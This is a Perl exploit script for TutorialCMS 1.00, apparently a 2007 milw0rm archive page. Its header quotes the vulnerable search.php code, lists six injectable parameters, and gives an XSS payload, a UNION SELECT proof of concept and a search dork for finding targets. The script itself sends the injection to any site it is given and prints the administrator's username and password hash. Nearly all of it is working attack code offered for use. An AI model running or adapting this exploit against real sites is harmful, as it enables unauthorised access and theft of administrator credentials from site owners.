<html><head><title>TutorialCMS <= 1.00 (search.php search) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#										#
#		     TutorialCMS &lt;= 1.00 SQL Injection Exploit			#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username &amp; Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (search.php):							#
#										#
#      $search = $_REQUEST['search'];						#
#      $sql    = &quot;SELECT * FROM tutorials WHERE title LIKE '%$search%' 		#
#		  ORDER BY hits DESC LIMIT $startID , $perPage&quot;; 		#
#										#
# Manual SQL Injection:								#
#      										#
#      	browseCat.php?catFile=[SQL QUERY]					#
#	browseSubCat.php?catFile=[SQL QUERY]					#
#	openTutorial.php?id=[SQL QUERY]						#
#	search.php?search=[SQL QUERY]						#
#	topFrame.php?id=[SQL QUERY]						#
#	admin/editListing.php?id=[SQL QUERY]					#
#										#
# NOTE: All above parameters are vulnerable to XSS, so try:			#
#										#
#	search.php?search=&quot;&gt;&lt;script&gt;alert('http://www.w4ck1ng.com')&lt;/script&gt;	#		
#										#
# PoC: http://victim.com/search.php?search=' UNION SELECT 0,0,0,0,username,	#
#      password,0,0,0,0,0,0,0 FROM users WHERE id='1' /*			#
# 										#
# Subject To: magic_quotes_gpc set to off					#
# GoogleDork: &quot;Powered By Photoshop Tutorials&quot; (0 Results)			#
#										#
# Shoutz: The entire w4ck1ng community						# 
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV &lt; 1){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;                 TutorialCMS &lt;= 1.00 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_tutorialcms.pl [PATH]\r\n\r\n&quot;;
print &quot;[PATH] = Path where TutorialCMS is located\r\n\r\n&quot;;
print &quot;e.g. w4ck1ng_tutorialcms.pl http://victim.com/tutorialcms/\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
exit();
}

$useragent = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$useragent-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

$sql = $ARGV[0] . &quot;search.php?search=' UNION SELECT 0,0,0,0,username,password,0,0,password,0,password,0,0 FROM users WHERE id='1' /*&quot;;
$result = $useragent-&gt;request(HTTP::Request-&gt;new(GET=&gt;$sql));

if($result-&gt;content =~ /&quot;&gt;&lt;b&gt;&lt;u&gt;([0-9a-zA-Z]+)&lt;\/u&gt;/){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;                 TutorialCMS &lt;= 1.00 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;[+] Admin User : $1\n&quot;;
}

else {print &quot;\n[-] Unable to retrieve admin username...&quot;}

if($result-&gt;content =~ /([0-9a-fA-F]{32})/){
print &quot;[+] Admin Hash : $1\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
}

else {print &quot;\n[-] Unable to retrieve admin hash...\n&quot;;}

# milw0rm.com [2007-05-09]</pre></html>